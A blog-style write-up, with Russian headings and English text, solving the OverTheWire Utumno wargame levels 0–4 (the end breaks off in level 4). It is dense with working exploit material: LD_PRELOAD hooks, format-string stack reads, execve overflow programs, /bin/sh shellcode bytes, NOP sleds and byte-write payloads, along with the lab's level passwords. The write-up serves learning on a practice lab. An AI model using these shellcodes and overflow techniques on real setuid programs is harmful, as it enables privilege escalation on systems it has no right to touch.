---
title: "[OTW] Разбор варгейма Utumno"
permalink: /writeups/otw/utumno/
excerpt: "Краткий разбор варгейма Utumno с OverTheWire."
---

---
{% include toc icon="cog" title="Utumno Wargame" %}
The [Utumno](http://overthewire.org/wargames/utumno/) wargame is an online game offered by the [OverTheWire](http://overthewire.org) community. This wargame is similar to the [Behemoth](http://overthewire.org/wargames/behemoth/) but, slightly harder. You should complete the previous wargames before starting this one.
{: .text-justify}

The challenges can be found in the **/utumno/** folder and the passwords for each level can be found in **/etc/utumno_pass/utumnoX**.

Kick back and relax, it's gonna be fun !

![image-center](/images/otw/wargame.gif){: .align-center}

## Решение Utumno 00

**SSH :** *ssh utumno0@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *utumno0*

Let's try to execute **utumno0**...

```bash
utumno0@utumno:~$ cd /utumno/
utumno0@utumno:/utumno$ ./utumno0
Read me! :P
```

Hum, weird. Maybe `file` can help us.

```bash
utumno0@utumno:/utumno$ file ./utumno0
./utumno0: executable, regular file, no read permission
```

**Заметка:** Here, **GDB** will be useless as we don't have read permission. You need to be creative.
{: .notice--info}

After some research, I decided to use the **LD_PRELOAD** environment variable. Basically, if your executable is dynamically linked, you can load a library to override (or replace) any functions or symbols preloaded from other libraries. If you don't know about **LD_PRELOAD**, you can read my post: [Playing with LD_PRELOAD](https://axcheron.github.io/playing-with-ld_preload/).

In our case, we got an output message saying **"Read me! :P"** (but, we can't read it as the executable don't have *read* permission). While we don’t really care about the message, it also means that there is some kind of function called to display this message. So, we could code a library to hook this function with **LD_PRELOAD** and explore the code from here.

However, we don’t really know which function is used to display the message (*fprintf()*, *printf()*, *puts()*, etc.). But it’s not really an issue, we can try each of them, I’ll start with **puts()**. Why ? Well, *puts()* is merely primitive version of *printf()* so, most of the time, if the call to *printf()* does not use any format string the **gcc** compiler will optimize *printf()* with a *puts()* call.

**Заметка:** I created a directory in `/tmp` to create and compile my library.
{: .notice--info}

```c
#include <stdio.h>
// gcc preload.c -o preload.so -fPIC -shared -ldl -m32
int puts ( const char * str ) {
	printf("Hello from 'puts' !");

	return 0;
}
```

Then, we test the code :

```bash
utumno0@utumno:/tmp/axc$ LD_PRELOAD="./preload.so" /utumno/utumno0
Hello from 'puts' !
```

So, it seems that the program is using *puts()* to print the message. Now, we could use *printf()* to read data on the **stack** by employing the same method used by the [Format String](https://axcheron.github.io/exploit-101-format-strings/) vulnerability.

```c
#include <stdio.h>

int puts ( const char * str ) {
	printf("%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\n");

	return 0;
}
```

The *%08x* string is interpreted by the *printf()* as specifiers resulting in reading data from the stack because there are no variables specified. So, for each **%08x**, *printf()* will fetch a number from the stack, treat this number as an address, and print out the memory contents pointed by this address as a string. Here is the result :

```bash
utumno0@utumno:/tmp/axc$ LD_PRELOAD="./preload.so" /utumno/utumno0
f7fee710.ffffd6e4.f7fcf52c.f7fc3dbc.00000000.ffffd6b8.08048402.080484a5.08048490.00000000
```

So, why did we do that ? Well, as it's a *wargame*, the password is probably somewhere in memory, but we can't **read** this executable so, we need to be creative. Here, I see 3 interesting addresses :

- `08048402`
- `080484a5`
- `08048490`

These addresses are not *NULL* or somewhere in the *Kernel address space*. They start with `0x0804` which means that the process can read, write and execute things on these memory areas. So, if we are lucky, maybe one of them is pointing on an interesting string. Let's check that assumption :

```c
#include <stdio.h>

int puts ( const char * str ) {
	printf("%s\n", 0x08048402);
	printf("%s\n", 0x080484a5);
	printf("%s\n", 0x08048490);

	return 0;
}
```

This code will interpret each addresses as a string pointer and print out the content. Now, we compile and execute.


```bash
utumno0@utumno:/tmp/axc$ LD_PRELOAD="./preload.so" /utumno/utumno0
���
Read me! :P
password: [..removed..]
```

The first one was tough, but we did it !

## Решение Utumno 01

**SSH :** *ssh utumno1@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *aathaeyiew*

This one does not have any output when we run it with or without argument so, let's try to `ltrace` it.

```bash
utumno1@utumno:/utumno$ ltrace ./utumno1 123
__libc_start_main(0x80484a5, 2, 0xffffd744, 0x8048530 <unfinished ...>
opendir("123")                                               = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

So, the code open the directory we specify as argument. Let's create a temporary directory and try again.

```bash
utumno1@utumno:/utumno$ltrace ./utumno1 /tmp/ax
__libc_start_main(0x80484a5, 2, 0xffffd764, 0x8048530 <unfinished ...>
opendir("/tmp/ax")                                                   = 0x804a008
readdir(0x804a008)                                                   = 0x804a024
strncmp("sh_", ".", 3)                                               = 69
readdir(0x804a008)                                                   = 0x804a034
strncmp("sh_", "..", 3)                                              = 69
readdir(0x804a008)                                                   = 0
+++ exited (status 0) +++
```

Now, the executable tries to read a filename starting by **"sh_"**. Let's create a file starting with **sh_** :

```bash
utumno1@utumno:/tmp/ax$ touch sh_AAAAAAAAAAAAAAAA
utumno1@utumno:/tmp/ax$ /utumno/utumno1 /tmp/ax
Segmentation fault
```

Segmentation fault ! That's good ! Now, we need to do some dynamic analysis (I'll skip the useless parts).

```nasm
utumno1@utumno:/tmp/ax$ gdb -q /utumno/utumno1
Reading symbols from /utumno/utumno1...done.
(gdb) set disassembly-flavor intel
(gdb) disas run
Dump of assembler code for function run:
   0x0804848b <+0>:	push   ebp
   0x0804848c <+1>:	mov    ebp,esp
   0x0804848e <+3>:	sub    esp,0x4
   0x08048491 <+6>:	lea    eax,[ebp-0x4]
   0x08048494 <+9>:	add    eax,0x8
   0x08048497 <+12>:	mov    DWORD PTR [ebp-0x4],eax
   0x0804849a <+15>:	mov    eax,DWORD PTR [ebp-0x4]
   0x0804849d <+18>:	mov    edx,DWORD PTR [ebp+0x8]
   0x080484a0 <+21>:	mov    DWORD PTR [eax],edx
   0x080484a2 <+23>:	nop
   0x080484a3 <+24>:	leave
   0x080484a4 <+25>:	ret
End of assembler dump.
(gdb) break *run+25
Breakpoint 1 at 0x80484a4: file utumno1.c, line 27.
(gdb) run /tmp/ax
Starting program: /utumno/utumno1 /tmp/ax

Breakpoint 1, 0x080484a4 in run (p=0x804a032) at utumno1.c:27
27	utumno1.c: No such file or directory.
(gdb) x/x $esp
0xffffd678:	0x0804a032
(gdb) x/x 0x0804a032
0x804a032:	0x41414141
```

Basically, I put a breakpoint at the `ret` instruction of the *run* function. You can see that the return address starts with `0x41414141`. It means that anything placed after **sh_** is executed as code. So, we need to create a filename with a shellcode embedded.

We just need to write a shellcode. Here, I choose to create a *symbolic link* on **/bin/sh** and call it using a custom shellcode.

```nasm
global _start

section .text
_start:
xor eax, eax
push eax
push 0x65646f63 ; name of the symlink (code)
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 0xb ; sys_execve
int 0x80
```

We compile it, create a symlink and extract the shellcode.

```bash
utumno1@utumno:/tmp/ax$ nasm -f elf32 shell.asm
utumno1@utumno:/tmp/ax$ ld -m elf_i386 -s -o shell shell.o
utumno1@utumno:/tmp/ax$ objdump -d ./shell.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
utumno1@utumno:/tmp/ax$ touch sh_$(python -c "print '\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
utumno1@utumno:/tmp/ax$ ln -s /bin/sh /tmp/ax/code
utumno1@utumno:/tmp/ax$ /utumno/utumno1 `pwd`
$ whoami
utumno2
$ cat /etc/utumno_pass/utumno2
ceewaceiph
```

Almost easy !

## Решение Utumno 02

**SSH :** *ssh utumno2@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *ceewaceiph*

In this level, the only result we get from the executable is **"Aw.."**. So, we'll analyse it with **GDB**:


```nasm
utumno2@utumno:/utumno$ gdb -q ./utumno2
Reading symbols from ./utumno2...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804844b <+0>:	push   ebp
   0x0804844c <+1>:	mov    ebp,esp
   0x0804844e <+3>:	sub    esp,0xc
   0x08048451 <+6>:	cmp    DWORD PTR [ebp+0x8],0x0 ; check if the number of args is 0
   0x08048455 <+10>:	je     0x804846b <main+32> ; if *ebp+0x8 = 0, continue
   0x08048457 <+12>:	push   0x8048510
   0x0804845c <+17>:	call   0x8048310 <puts@plt>
   0x08048461 <+22>:	add    esp,0x4
   0x08048464 <+25>:	push   0x1
   0x08048466 <+27>:	call   0x8048320 <exit@plt>
   0x0804846b <+32>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804846e <+35>:	add    eax,0x28
   0x08048471 <+38>:	mov    eax,DWORD PTR [eax]
   0x08048473 <+40>:	push   eax
   0x08048474 <+41>:	lea    eax,[ebp-0xc]
   0x08048477 <+44>:	push   eax
   0x08048478 <+45>:	call   0x8048300 <strcpy@plt>
   0x0804847d <+50>:	add    esp,0x8
   0x08048480 <+53>:	mov    eax,0x0
   0x08048485 <+58>:	leave
   0x08048486 <+59>:	ret
End of assembler dump.
```

Now, everything makes sense, when we execute the program, it automatically quits with the message **Aw..**. This is due to the fact that the program check if *argc* is equal to **0** (line *main+6*). However, even without any arguments, *argc* will be equal to **1** which corresponds to the program name (here, **"/utumno/utumno2"**).

To solve this issues we can use *execve()*. As per the documentation *execve()* executes the program referred to by **pathname**. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and data segments. So, we can redefine *argv* to NULL, like so:

```c
#include <unistd.h>

void main() {
    char *envp[] = {};

    execve("/utumno/utumno2", NULL, envp);
}
```

Then, we can use *envp* to pass arguments to our binary. Why ? Well, if you take a look at the stack of a loaded binary, you'll have **argc** (or the arguments counter), **argv** (list of pointer to arguments) and **envp** (list of pointers to environment variables).

![image-center](/images/otw/elf_stack.png){: .align-center}{:width="500px"}

So, as we don't have any arguments, we will play with environment variables. Here, we can do whatever we want, as we are using *execve()* all the environment variables are cleared. Now, with that assumptions, let's analyze the second part of the code.

```nasm
0x0804844b <+0>:	push   ebp
0x0804844c <+1>:	mov    ebp,esp
0x0804844e <+3>:	sub    esp,0xc
0x08048451 <+6>:	cmp    DWORD PTR [ebp+0x8],0x0
0x08048455 <+10>:	je     0x804846b <main+32>
0x08048457 <+12>:	push   0x8048510
0x0804845c <+17>:	call   0x8048310 <puts@plt>
0x08048461 <+22>:	add    esp,0x4
0x08048464 <+25>:	push   0x1
0x08048466 <+27>:	call   0x8048320 <exit@plt>
0x0804846b <+32>:	mov    eax,DWORD PTR [ebp+0xc]; Get the first pointer of envp
0x0804846e <+35>:	add    eax,0x28; Add 40 to get the 10th pointer
0x08048471 <+38>:	mov    eax,DWORD PTR [eax]; Set it as source string for strcpy()
0x08048473 <+40>:	push   eax
0x08048474 <+41>:	lea    eax,[ebp-0xc]; Set ESP as destination for strcpy()
0x08048477 <+44>:	push   eax;
0x08048478 <+45>:	call   0x8048300 <strcpy@plt>; Call strcpy()
0x0804847d <+50>:	add    esp,0x8
0x08048480 <+53>:	mov    eax,0x0
0x08048485 <+58>:	leave
0x08048486 <+59>:	ret
```

Now, we need to create an array with **11** values knowing that the 10th value will probably overflow *strcpy()* and the last value will be NULL (check the picture I showed you earlier).

```c
#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "", "",
        "AAAABBBBCCCCDDDDEEEEFFFFAAAA",
        NULL};
    execve("/utumno/utumno2", NULL, envp);
}
```

This code *segfault* but *strace* show that we took control of EIP.

```bash
utumno2@utumno:/tmp/ax_test$ gcc -m32 -static execve.c -o execve
utumno2@utumno:/tmp/ax_test$ ./execve
Segmentation fault

utumno2@utumno:/tmp/ax_test$ strace ./execve
execve("./execve", ["./execve"], [/* 21 vars */]) = 0
strace: [ Process PID=1008 runs in 32 bit mode. ]
brk(NULL)                               = 0x56558000

... [removed] ...

--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x45454545} ---
+++ killed by SIGSEGV (core dumped) +++
```

See the **SIGSEGV** *si_addr* address ? We need **24** bytes to overwrite the EIP ! However, we don't have enough space for a shellcode but we could use another environment variable to store it and jump to the shellcode !

```c
#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "", "",
        "AAAABBBBCCCCDDDDEEEE",
        NULL};
    execve("/utumno/utumno2", NULL, envp);
}
```

Now, let's write a quick **/bin/sh** shellcode:

```nasm
global _start

section .text
_start:
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 0xb
int 0x80
```

Assemble it and extract the shellcode :

```bash
utumno2@utumno:/tmp/ax$ nasm -f elf32 shell.a
utumno2@utumno:/tmp/ax$ ld -m elf_i386 -s -o shell shell.o

objdump -d ./shell.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Then, we modify our code :

```c
#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
        "AAAABBBBCCCCDDDDEEEE",
        NULL};
    execve("/utumno/utumno2", NULL, envp);
}
```

Finally, we try to find a valid return address :

```nasm
utumno2@utumno:/tmp/ax$ gdb -q ./code
Reading symbols from ./code...(no debugging symbols found)...done.
(gdb) run
Starting program: /tmp/ax/code
process 32547 is executing new program: /utumno/utumno2

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()

(gdb) x/200x $esp
0xffffde00:	0x00000000	0xffffde94	0xffffde98	0x00000000
0xffffde10:	0x00000000	0x00000000	0xf7fc5000	0xf7ffdc0c
0xffffde20:	0xf7ffd000	0x00000000	0x00000000	0xf7fc5000
0xffffde30:	0x00000000	0xe69060ed	0xdc68ecfd	0x00000000
0xffffde40:	0x00000000	0x00000000	0x00000000	0x08048350
0xffffde50:	0x00000000	0xf7fee710	0xf7e2a199	0xf7ffd000
0xffffde60:	0x00000000	0x08048350	0x00000000	0x08048371
0xffffde70:	0x0804844b	0x00000000	0xffffde94	0x08048490
0xffffde80:	0x080484f0	0xf7fe9070	0xffffde8c	0xf7ffd920
0xffffde90:	0x00000000	0x00000000	0xffffdf99	0xffffdf9a
0xffffdea0:	0xffffdf9b	0xffffdf9c	0xffffdf9d	0xffffdf9e
0xffffdeb0:	0xffffdf9f	0xffffdfa0	0xffffdfa1	0xffffdfd3
0xffffdec0:	0x00000000	0x00000020	0xf7fd7c90	0x00000021
0xffffded0:	0xf7fd7000	0x00000010	0x178bfbff	0x00000006
0xffffdee0:	0x00001000	0x00000011	0x00000064	0x00000003
0xffffdef0:	0x08048034	0x00000004	0x00000020	0x00000005
0xffffdf00:	0x00000008	0x00000007	0xf7fd9000	0x00000008
0xffffdf10:	0x00000000	0x00000009	0x08048350	0x0000000b
0xffffdf20:	0x00003e82	0x0000000c	0x00003e82	0x0000000d
0xffffdf30:	0x00003e82	0x0000000e	0x00003e82	0x00000017
0xffffdf40:	0x00000001	0x00000019	0xffffdf7b	0x0000001a
0xffffdf50:	0x00000000	0x0000001f	0xffffdfe8	0x0000000f
0xffffdf60:	0xffffdf8b	0x00000000	0x00000000	0x00000000
0xffffdf70:	0x00000000	0x00000000	0x37000000	0x30c66ef5
0xffffdf80:	0x70890c96	0x9ae995f3	0x69640792	0x00363836
0xffffdf90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffdfa0:	0x90909000	0x90909090	0x90909090	0x90909090
0xffffdfb0:	0x90909090	0x90909090	0x50c03190	0x732f2f68
0xffffdfc0:	0x622f6868	0xe3896e69	0x53e28950	0x0bb0e189
0xffffdfd0:	0x410080cd	0x42414141	0x43424242	0x44434343
0xffffdfe0:	0x45444444	0x00454545	0x7574752f	0x2f6f6e6d
0xffffdff0:	0x6d757475	0x00326f6e	0x00000000	0x00000000
0xffffe000:	Cannot access memory at address 0xffffe000
```

Here I choose `0xffffdfb0` as it point on my NOP sled. Then we recompile the code with the proper return address :

```c
#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "",
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
        "AAAABBBBCCCCDDDD\xb0\xdf\xff\xff",
        NULL};
    execve("/utumno/utumno2", NULL, envp);
}
```

```bash
utumno2@utumno:/tmp/ax$ gcc -m32 -static code.c -o code
utumno2@utumno:/tmp/ax$ ./code
$ whoami
utumno3
$ cat /etc/utumno_pass/utumno3
zuudafiine
$
```

Done.

## Решение Utumno 03

**SSH :** *ssh utumno3@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *zuudafiine*

This one was a tough one. Here, your input will be used to overwrite the return address. First let's check the code :

```nasm
0x080483eb <+0>:	push   ebp
0x080483ec <+1>:	mov    ebp,esp
0x080483ee <+3>:	push   ebx
0x080483ef <+4>:	sub    esp,0x38
0x080483f2 <+7>:	mov    DWORD PTR [ebp-0xc],0x0
0x080483f9 <+14>:	mov    eax,DWORD PTR [ebp-0xc]
0x080483fc <+17>:	mov    DWORD PTR [ebp-0x8],eax
0x080483ff <+20>:	jmp    0x804844d <main+98>
0x08048401 <+22>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048404 <+25>:	mov    ecx,eax
0x08048406 <+27>:	lea    edx,[ebp-0x3c]
0x08048409 <+30>:	mov    eax,DWORD PTR [ebp-0x8] ;
0x0804840c <+33>:	add    eax,edx
0x0804840e <+35>:	mov    BYTE PTR [eax],cl
0x08048410 <+37>:	lea    edx,[ebp-0x3c]
0x08048413 <+40>:	mov    eax,DWORD PTR [ebp-0x8]
0x08048416 <+43>:	add    eax,edx
0x08048418 <+45>:	movzx  ecx,BYTE PTR [eax]
0x0804841b <+48>:	mov    eax,DWORD PTR [ebp-0x8]
0x0804841e <+51>:	mov    edx,eax
0x08048420 <+53>:	mov    eax,edx
0x08048422 <+55>:	add    eax,eax
0x08048424 <+57>:	add    eax,edx
0x08048426 <+59>:	xor    ecx,eax
0x08048428 <+61>:	lea    edx,[ebp-0x3c]
0x0804842b <+64>:	mov    eax,DWORD PTR [ebp-0x8]
0x0804842e <+67>:	add    eax,edx
0x08048430 <+69>:	mov    BYTE PTR [eax], cl
0x08048432 <+71>:	lea    edx,[ebp-0x3c]
0x08048435 <+74>:	mov    eax,DWORD PTR [ebp-0x8]
0x08048438 <+77>:	add    eax,edx
0x0804843a <+79>:	movzx  eax, BYTE PTR [eax]
0x0804843d <+82>:	movsx  ebx,al
0x08048440 <+85>:	call   0x80482c0 <getchar@plt>
0x08048445 <+90>:	mov    BYTE PTR [ebp+ebx*1-0x24],al
0x08048449 <+94>:	add    DWORD PTR [ebp-0x8],0x1
0x0804844d <+98>:	call   0x80482c0 <getchar@plt>
0x08048452 <+103>:	mov    DWORD PTR [ebp-0xc],eax
0x08048455 <+106>:	cmp    DWORD PTR [ebp-0xc],0xffffffff
0x08048459 <+110>:	je     0x8048461 <main+118>
0x0804845b <+112>:	cmp    DWORD PTR [ebp-0x8],0x17
0x0804845f <+116>:	jle    0x8048401 <main+22>
0x08048461 <+118>:	mov    eax,0x0
0x08048466 <+123>:	add    esp,0x38
0x08048469 <+126>:	pop    ebx
0x0804846a <+127>:	pop    ebp
0x0804846b <+128>:	ret
```

If you take a look at the code we have two call to *getchar()* (`main+85` and `main+98`). The first call will be used to specify **where** you want to write (the offset) and the second will be **what** you want to write (the return address). We'll have to do that one byte at a time. Based on that assumption, our payload to overwrite the return address will be 8 bytes long (4 locations + 4 bytes to write).

The important part is at `main+90` where you can see `mov BYTE PTR [ebp+ebx*1-0x24], al`. This line will compute the address where your return address will be overwrote. First, let's get **EBP** and the location of the return address.

```nasm
$ gdb -q ./utumno3
Reading symbols from ./utumno3...done.
(gdb) set disassembly-flavor intel
(gdb) break main
Breakpoint 1 at 0x80483f2: file utumno3.c, line 26.
(gdb) run
Starting program: /utumno/utumno3

Breakpoint 1, main (argc=1, argv=0xffffd724) at utumno3.c:26
26	utumno3.c: No such file or directory.
(gdb) x/8x $ebp
0xffffd688:	0x00000000	0xf7e2a286	0x00000001	0xffffd724
0xffffd698:	0xffffd72c	0x00000000	0x00000000	0x00000000
(gdb)
```

Here, **EBP**, the base stack pointer is `0xffffd688` and the return address is `0xf7e2a286`. So if we want to overwrite the last byte of the address (**0x86**), we need to write at `0xffffd68c`. You can check that in **GDB** :

```nasm
(gdb) x/bx 0xffffd68c
0xffffd68c:	0x86
```

So now, it gets a bit more complex. I'll comment the code, but only for the first iteration of the loop.

```nasm
0x08048401 <+22>:	mov    eax,DWORD PTR [ebp-0xc] ; EAX = first char.
0x08048404 <+25>:	mov    ecx,eax ; ECX = first char.
0x08048406 <+27>:	lea    edx,[ebp-0x3c] ; load a ptr to a stack location
0x08048409 <+30>:	mov    eax,DWORD PTR [ebp-0x8] ; EAX = 0 (first loop iteration)
0x0804840c <+33>:	add    eax,edx ; ptr + 0
0x0804840e <+35>:	mov    BYTE PTR [eax],cl ; move the first char. to the stack
0x08048410 <+37>:	lea    edx,[ebp-0x3c] ; restore the ptr original value
0x08048413 <+40>:	mov    eax,DWORD PTR [ebp-0x8] ; EAX = 0
0x08048416 <+43>:	add    eax,edx ; ptr + 0
0x08048418 <+45>:	movzx  ecx,BYTE PTR [eax] ; move the first char in ECX
0x0804841b <+48>:	mov    eax,DWORD PTR [ebp-0x8] ; EAX = 0
0x0804841e <+51>:	mov    edx,eax ; EDX = 0
0x08048420 <+53>:	mov    eax,edx ; EAX = 0
0x08048422 <+55>:	add    eax,eax ; EAX = 0
0x08048424 <+57>:	add    eax,edx ; EAX = 0
0x08048426 <+59>:	xor    ecx,eax ; ECX = 0
0x08048428 <+61>:	lea    edx,[ebp-0x3c] ; restore the ptr original value
0x0804842b <+64>:	mov    eax,DWORD PTR [ebp-0x8] ; EAX = 0
0x0804842e <+67>:	add    eax,edx ; EAX = ptr + 0
0x08048430 <+69>:	mov    BYTE PTR [eax],cl ; move the first char in ECX
0x08048432 <+71>:	lea    edx,[ebp-0x3c] ; restore the ptr original value
0x08048435 <+74>:	mov    eax,DWORD PTR [ebp-0x8] ; EAX = 0
0x08048438 <+77>:	add    eax,edx ; EAX = ptr + 0
0x0804843a <+79>:	movzx  eax,BYTE PTR [eax] ; move the first char in EAX
0x0804843d <+82>:	movsx  ebx,al ; move the first char in EBX
0x08048440 <+85>:	call   0x80482c0 <getchar@plt> ; get the second char
0x08048445 <+90>:	mov    BYTE PTR [ebp+ebx*1-0x24],al ; move the second char @ebp+ebx*1-0x24
0x08048449 <+94>:	add    DWORD PTR [ebp-0x8],0x1 ; increment the loop counter by 1
```

As you can see, at **main+90**, the address where you want to write the second char will depend on **EBX** value (the first char) but also, the loop counter. The first iteration is quite easy as the result of the **XOR** operation will be 0. Let's compute the address and write the first part of the payload.

```text
EBP = 0xffffd688
EBX = 0x00000041 (just a example with 'A')
Target = 0xffffd68c (first part of the ret address)
EBP + EBX = 0xFFFFD6C9
0xFFFFD6C9 - 0x24 = 0xFFFFD6A5
```

Ok, the result is not good. We need to obtain `0xffffd68c` not ``0xffffd6a5`. After a few try I found the right value for our first byte: **0x28**.

```text
EBP = 0xffffd688
EBX = 0x00000028 (just a example with 'A')
Target = 0xffffd68c (first part of the ret address)
EBP + EBX = 0xFFFFD6B0
0xFFFFD6C9 - 0x24 = 0xFFFFD68C
```

Let's do that in **GDB** :

```nasm
(gdb) break *main+94
Breakpoint 2 at 0x8048449: file utumno3.c, line 30.
(gdb) run <<< $(python -c "print '\x28\x41'")

Starting program: /utumno/utumno3 <<< $(python -c "print '\x28\x41'")

Breakpoint 2, main (argc=1, argv=0xffffd724) at utumno3.c:30
30	in utumno3.c
(gdb) x/8wx $ebp
0xffffd688:	0x00000000	0xf7e2a241	0x00000001	0xffffd724
0xffffd698:	0xffffd72c	0x00000000	0x00000000	0x00000000
```

Perfect we overwrote the last byte of the return address with **0x41**. As the process will be the same for the other bytes, I won't decribe it. However, note that at the first iteration the first char is xored with 0, at the second iteration the third char will be xored with 3, at the third iteration, the fifth char will be xored with 6 and finally, the seventh char will be xored with 9.

Here is the final payload :

```nasm
(gdb) run <<< $(python -c "print '\x28\x41\x2a\x42\x2c\x43\x22\x44'")
Starting program: /utumno/utumno3 <<< $(python -c "print '\x28\x41\x2a\x42\x2c\x43\x22\x44'")

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
=> 0x44434241:	Cannot access memory at address 0x44434241
```

The last step is to create an environement variable containing our shellcode and find a proper return address. Note that this shellcode read the password at `/etc/utumno_pass/utumno4`, it does not give a **/bin/sh**.

```bash
utumno3@melinda:/tmp/uh3$export EGG=`python -c 'print "\x90"*500 + "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x61\x78\x63\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'`
utumno3@melinda:/tmp/uh3$ ln -s /etc/utumno_pass/utumno4 /tmp/axc
$ gdb -q ./utumno3
Reading symbols from ./utumno3...done.
(gdb) set disassembly-flavor intel
(gdb) break *main
Breakpoint 1 at 0x80483eb: file utumno3.c, line 20.
(gdb) run
Starting program: /utumno/utumno3

Breakpoint 1, main (argc=1, argv=0xffffd504) at utumno3.c:20
20	utumno3.c: No such file or directory.
(gdb) x/1200x $esp-1200
0xffffcfbc:	0x00000003	0x00554e47	0x9153bb84	0x00000000
...
0xffffdc1c:	0x5f485353	0x4e4e4f43	0x49544345	0x313d4e4f
0xffffdc2c:	0x312e3430	0x312e3336	0x382e3936	0x34352036
0xffffdc3c:	0x20393733	0x2e323931	0x2e383631	0x2e313031
0xffffdc4c:	0x32203039	0x47450032	0x90903d47	0x90909090
0xffffdc5c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdc6c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdc7c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdc8c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdc9c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdcac:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdcbc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdccc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdcdc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdcec:	0x90909090	0x90909090	0x90909090	0x90909090
```

Here I used `0xffffdc9c` as return address. Now, we can try that in our shell :

```bash
$ python -c "print '\x28\x9c\x2a\xdc\x2c\xff\x22\xff'" | ./utumno3
oogieleoga
```

If your math is right, you get the password.

## Решение Utumno 04

**SSH :** *ssh utumno4@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *oogieleoga*

Here, if you don't pass an argument you get a *segfault*. Let's analyse this executable in **GDB**.

```nasm
0x0804844b <+0>:	push   ebp
0x0804844c <+1>:	mov    ebp,esp
0x0804844e <+3>:	sub    esp,0xff04
0x08048454 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048457 <+12>:	add    eax,0x4
0x0804845a <+15>:	mov    eax,DWORD PTR [eax] EAX = ptr to our input string
0x0804845c <+17>:	push   eax ; push the ptr on the stack
0x0804845d <+18>:	call   0x8048330 <atoi@plt> ; convert it to integer
0x08048462 <+23>:	add    esp,0x4
0x08048465 <+26>:	mov    DWORD PTR [ebp-0x4],eax ; store the result of atoi()
0x08048468 <+29>:	mov    eax,DWORD PTR [ebp-0x4] ; move the result in eax
0x0804846b <+32>:	mov    WORD PTR [ebp-0x6],ax ; move AX on the stack
0x0804846f <+36>:	cmp    WORD PTR [ebp-0x6],0x3f; compare AX to 63
0x08048474 <+41>:	jbe    0x804847d <main+50> ; if below or equal to 63 continue
0x08048476 <+43>:	push   0x1
0x08048478 <+45>:	call   0x8048310 <exit@plt>
0x0804847d <+50>:	mov    edx,DWORD PTR [ebp-0x4]
0x08048480 <+53>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048483 <+56>:	add    eax,0x8
0x08048486 <+59>:	mov    eax,DWORD PTR [eax] ; ptr to the second argument
0x08048488 <+61>:	push   edx ; number of bytes to copy (first arg)
0x08048489 <+62>:	push   eax ; source of data to be copied (second arg)
0x0804848a <+63>:	lea    eax,[ebp-0xff02]
0x08048490 <+69>:	push   eax ; destination where the data is to be copied
0x08048491 <+70>:	call   0x8048300 <memcpy@plt>
0x08048496 <+75>:	add    esp,0xc
0x08048499 <+78>:	mov    eax,0x0
0x0804849e <+83>:	leave
0x0804849f <+84>:	ret
```

As you can see, we need to pass to arguments. The first one is the size of our buffer and the second one is the buffer itself. I used **65536** as it is the max value of an unsigned half-word. By doing that we make sure that **AX** will be zero (AX is the lower half of EAX).

